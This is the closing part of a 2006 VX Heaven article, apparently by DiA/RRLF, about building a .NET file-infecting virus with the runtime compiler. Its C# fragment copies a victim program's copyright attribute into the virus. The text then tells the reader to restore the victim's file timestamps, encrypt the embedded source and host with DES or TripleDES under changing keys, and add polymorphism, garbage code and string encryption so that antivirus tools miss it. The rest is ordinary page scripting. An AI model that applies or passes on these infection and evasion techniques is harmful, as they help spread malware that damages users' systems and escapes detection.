&nbsp; &nbsp; &nbsp; &nbsp; AssemblyCopyrightAttribute Copyleft <span style="color: #008000;">=</span> Attribute <span style="color: #0600FF; font-weight: bold;">as</span> AssemblyCopyrightAttribute<span style="color: #008000;">;</span> <span style="color: black; font-style: italic;">//as copyright attribute, as example</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0600FF; font-weight: bold;">if</span><span style="color: black;">&#40;</span>Copyleft <span style="color: #008000;">!=</span> <span style="color: #0600FF; font-weight: bold;">null</span><span style="color: black;">&#41;</span> <span style="color: black; font-style: italic;">//found copyright attribute?</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #6666cc; font-weight: bold;">string</span> OldCopyright <span style="color: #008000;">=</span> Copyleft<span style="color: #008000;">.</span><span style="color: #0000FF;">Copyright</span><span style="color: #008000;">;</span> <span style="color: black; font-style: italic;">//the copyright to string</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; <span style="color: black;">&#125;</span> <span style="color: black; font-style: italic;">//others can be read in the same way</span><br/>
&nbsp; &nbsp; <span style="color: black; font-style: italic;">//...</span><br/>
<br/>
&nbsp; &nbsp; Then write <span style="color: #0600FF; font-weight: bold;">in</span> the virus source <span style="color: black;">&#40;</span>after used namespaces, before own <span style="color: #0600FF; font-weight: bold;">namespace</span><span style="color: black;">&#41;</span> <span style="color: #0600FF; font-weight: bold;">this</span><br/>
&nbsp; &nbsp; <span style="color: black;">&#40;</span>don<span style="color: #666666;">'t foget namespaces System.Reflection and System.Runtime.CompilerServices):<br/>
<br/>
&nbsp; &nbsp; //...<br/>
&nbsp; &nbsp; [assembly: AssemblyCopyright(OldCopyright)]<br/>
&nbsp; &nbsp; //...<br/>
</span></div>
<p>Other assembly informations are AssemblyTitle, AssemblyDescription, AssemblyConfiguration, AssemblyCompany, AssemblyProduct, AssemblyTrademark, AssemblyCulture.</p>
<p><strong>Filetime?</strong></p>
<p>Also take care for filetime, read filetime of potential victim and set it after compilation again. Easy, huh?</p>
<p><strong>Detected in &lt; 1min?</strong></p>
<p>This is not a hard take for AV people, cause the plain source is stored. So a good idea is to encrypt the source code resource. Maybe also with a changing key. .NET provides also encryption classes like DES or even TripleDES. Also you can encrypt the host resource, so it can't be easiely cut out of the virus and be restored.</p>
<p><strong>More More More!</strong></p>
<p>Now it's on you, imagin you are at source level, so polymorphism is not a hard take, also adding garbage is a good idea. Encrypt strings, split source to 100s classes, etc etc. <em>Use your brain.</em></p>
<h2><a name="c7"></a>Outro</h2>
<p>Hope you liked this article and the idea how to use the .NET runtime compiler for file infection. If you do anything in this way, let me know, <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="2e6a476f71464f5a4b5d71434f4d4647404b6e494356004a4b00">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script></p>
<p>Next time friends, bye.</p>
<div align="right">DiA/RRLF - 23.08.2006</div>
[<a style="" href="/lib/?lang=EN&amp;index=VT#vdi02">Back to index</a>] [<a href="/lib/vdi02.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vdi02">de</a><a href="/lib/index.php?lang=en&amp;id=vdi02">en</a><a href="/lib/index.php?lang=es&amp;id=vdi02">es</a><a href="/lib/index.php?lang=it&amp;id=vdi02">it</a><a href="/lib/index.php?lang=fr&amp;id=vdi02">fr</a><a href="/lib/index.php?lang=pl&amp;id=vdi02">pl</a><a href="/lib/index.php?lang=ru&amp;id=vdi02">ru</a><a href="/lib/index.php?lang=ua&amp;id=vdi02">ua</a></div>
</body>
</html>
